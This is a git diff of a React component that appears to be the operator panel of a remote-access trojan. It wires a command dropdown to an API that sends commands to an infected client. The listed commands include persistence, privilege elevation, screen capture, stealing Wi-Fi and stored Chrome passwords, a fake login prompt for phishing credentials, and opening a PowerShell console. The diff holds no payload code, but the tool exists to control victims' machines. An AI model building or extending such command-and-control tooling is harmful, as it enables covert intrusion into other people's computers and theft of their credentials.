@@ -1,29 +1,42 @@
 import {Button, Form} from "react-bootstrap";
 import {NavLink} from "react-router-dom";
 import React, {useState} from "react";
+import {sendCommand} from "../../api/api";
 
-function ClientActions() {
-    const [fileName, setFileName] = useState("Upload Boundary File");
+function ClientActions(props) {
+    const [fileName, setFileName] = useState(null);
+    const [command, setCommand] = useState(null);
+
+    async function SendCommand()
+    {
+        console.log(command);
+        if(!await sendCommand(props.client.client_id, command)){
+            //handle errors from server
+        }
+    }
     return <>
         <Form.Group controlId="command">
             <Form.Label className={"small-titles"} id={"title2"}>Command</Form.Label>
-            <Form.Control as="select">
-                <option>Persistence</option>
-                <option>Elevate</option>
-                <option>Upload</option>
-                <option>Download</option>
-                <option>Change background</option>
-                <option>Screen capture</option>
-                <option>Get system information</option>
-                <option>Get network information</option>
-                <option>Get wifi passwords</option>
-                <option>Get stored chrome passwords</option>
-                <option>Prompt user for login UI</option>
+            <Form.Control as="select" value={command} onChange={e => {
+                setCommand(e.target.value);
+            }}>
+                <option value={"stayhome"}>Persistence</option>
+                <option value={"elevate"}>Elevate</option>
+                <option value={"upload"}>Upload</option>
+                <option value={"download"}>Download</option>
+                <option value={"change-image"}>Change background</option>
+                <option value={"capture"}>Screen capture</option>
+                <option value={"get-network"}>Get network information</option>
+                <option value={"getwifi"}>Get wifi passwords</option>
+                <option value={"webPass"}>Get stored chrome passwords</option>
+                <option value={"PromptUser"}>Prompt user for login UI</option>
+                <option value={"StartPS"}>Start powershell console</option>
+
             </Form.Control>
-            <Form.File className={"small-titles"} id="upload-file" label="Choose file" />
+            <Form.File className={"small-titles"} id="upload-file" label="Choose file" onChange={(e) => setFileName(e.target.files[0].name)}/>
         </Form.Group>
         <Form.Group controlId="sendCommand">
-            <Button class="buttons" id={"send-button"} variant={"success"}>Send</Button>
+            <Button class="buttons" id={"send-button"} variant={"success"} onClick={SendCommand}>Send</Button>
         </Form.Group>
         <Form.Group controlId="response">
             <Form.Label className={"small-titles"} id={"title3"}>Response</Form.Label>
